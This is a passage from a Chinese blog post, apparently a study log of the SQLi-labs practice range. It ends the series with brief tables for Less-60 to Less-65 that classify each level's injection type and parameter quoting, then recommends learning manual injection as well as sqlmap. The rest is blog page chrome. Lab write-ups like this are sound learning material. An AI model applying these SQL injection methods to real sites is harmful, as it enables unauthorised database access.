<h2 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">报错、布尔盲注、延时盲注</td>
<td align="left"><code>id=（&quot;$id&quot;）</code></td>
</tr>
</tbody></table>
<p>与 Less-58 注入方式一致，只是拼接方式不一样罢了，详见 Less-58</p>
<h2 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">报错、布尔盲注、延时盲注</td>
<td align="left"><code>id=((&#39;$id&#39;))</code></td>
</tr>
</tbody></table>
<p>与 Less-58 注入方式一致，只是拼接方式不一样罢了，详见 Less-58</p>
<h2 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">布尔盲注、延时盲注</td>
<td align="left"><code>id=(&#39;$id&#39;)</code></td>
</tr>
</tbody></table>
<p>此时报错也取消了，这里只能进行布尔盲注或者延时盲注了，这是一个大工程，在实战工程中还是靠 sqlmap 这种自动化注入神器了，手工注入的话岂不是得天荒地老。</p>
<h2 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">布尔盲注、延时盲注</td>
<td align="left"><code>id=&#39;$id&#39;</code></td>
</tr>
</tbody></table>
<p>与 Less-62 注入方式一致，只是拼接方式不一样罢了，详见 Less-62</p>
<h2 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">布尔盲注、延时盲注</td>
<td align="left"><code>id=(($id))</code></td>
</tr>
</tbody></table>
<p>与 Less-62 注入方式一致，只是拼接方式不一样罢了，详见 Less-62</p>
<h2 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">布尔盲注、延时盲注</td>
<td align="left"><code>id=(&quot;$id&quot;)</code></td>
</tr>
</tbody></table>
<p>与 Less-62 注入方式一致，只是拼接方式不一样罢了，详见 Less-62</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>实际上 sqlmap 也很强大，尤其是在盲注这一块效率比手工要快很多，但是正如 某些大佬说的一样，一上来就使用工具这样只会变成最垃圾的脚本小子（script kids），所以手工注入还是系统的学习掌握一下的，手工注入在存在联合和报错注入的情况下，注入速度也是不低于 sqlmap 的哦。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lcamry/">lcamry 大佬的《MySQL注入天书》</a></li>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/98096">Dnslog 在 SQL 注入中的实战</a></li>
</ul>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">F10Sec</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://F10Sec.github.io/2022/01/20/sqli-labs-ba-chang-xue-xi-ji-lu/">https://F10Sec.github.io/2022/01/20/sqli-labs-ba-chang-xue-xi-ji-lu/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">F10Sec</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/SQLI-labs-%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/">
                                    <span class="chip bg-color">SQLI-labs 靶场学习</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2022/01/24/mac-sheng-ji-nodejs-he-npm-dao-zui-xin-ban/">
                    <div class="card-image">
                        
                        
                        <img src="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/medias/featureimages/7.jpg" class="responsive-img" alt="MAC升级Nodejs和Npm到最新版">
                        
                        <span class="card-title">MAC升级Nodejs和Npm到最新版</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2022-01-24
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            F10Sec
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/Nodejs-Npm/">
                        <span class="chip bg-color">Nodejs  Npm</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2022/01/19/shi-yong-fofa-que-ding-wang-zhan-zhen-shi-ip-di-zhi-de-xiao-ji-qiao/">
                    <div class="card-image">
                        
                        
                        <img src="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/medias/featureimages/7.jpg" class="responsive-img" alt="使用Fofa确定网站真实IP地址的小技巧">
                        
                        <span class="card-title">使用Fofa确定网站真实IP地址的小技巧</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-19
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            F10Sec
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/FOFA-%E7%9C%9F%E5%AE%9EIP%E5%AE%9A%E4%BD%8D/">
                        <span class="chip bg-color">FOFA 真实IP定位</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('120')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: F10Sec<br />'
            + '文章作者: F10Sec<br />'
            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/libs/aplayer/APlayer.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>

    
    <div class="container row center-align" style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2022</span>
            
            <span id="year">2022</span>
            <a href="/about" target="_blank">F10Sec</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                class="white-color">42.4k</span>&nbsp;字
            
            
            
            
            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
            
            <br>
            
            <span id="sitetime">载入运行时间...</span>
            <script>
                function siteTime() {
                    var seconds = 1000;
                    var minutes = seconds * 60;
                    var hours = minutes * 60;
                    var days = hours * 24;
                    var years = days * 365;
                    var today = new Date();
                    var startYear = "2022";
                    var startMonth = "1";
                    var startDate = "19";
                    var startHour = "10";
                    var startMinute = "48";
                    var startSecond = "0";
                    var todayYear = today.getFullYear();
                    var todayMonth = today.getMonth() + 1;
                    var todayDate = today.getDate();
                    var todayHour = today.getHours();
                    var todayMinute = today.getMinutes();
                    var todaySecond = today.getSeconds();
                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                    var diff = t2 - t1;
                    var diffYears = Math.floor(diff / years);
                    var diffDays = Math.floor((diff / days) - diffYears * 365);
                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
                        minutes);
                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
                        diffMinutes * minutes) / seconds);
                    if (startYear == todayYear) {
                        document.getElementById("year").innerHTML = todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    } else {
                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    }
                }
                setInterval(siteTime, 1000);
            </script>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/F10Sec" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:admin@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=admin" class="tooltipped" target="_blank" data-tooltip="QQ联系我: admin" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/libs/materialize/materialize.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/libs/aos/aos.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

	
    
    <script type="text/javascript" color="0,0,255"
        pointColor="0,0,255" opacity='0.7'
        zIndex="-1" count="99"
        src="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/libs/background/canvas-nest.js"></script>
    

    

    

    
    <script src="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/libs/instantpage/instantpage.js" type="module"></script>
    

    <script type="text/javascript"> //只在桌面版网页启用特效 
    var windowWidth = $(window).width(); 
    if (windowWidth > 768) { 
        document.write('<script type="text/javascript" src="/js/sakura.js"><\/script>'); 
    } 
    </script>

    <script type="text/javascript"> 
        WIDGET = {FID: '1tFpFZ5Mtj'}
     </script> 
     
     <script type="text/javascript" src="https://apip.weatherdt.com/float/static/js/r.js?v=1111"></script>


</body>

</html>
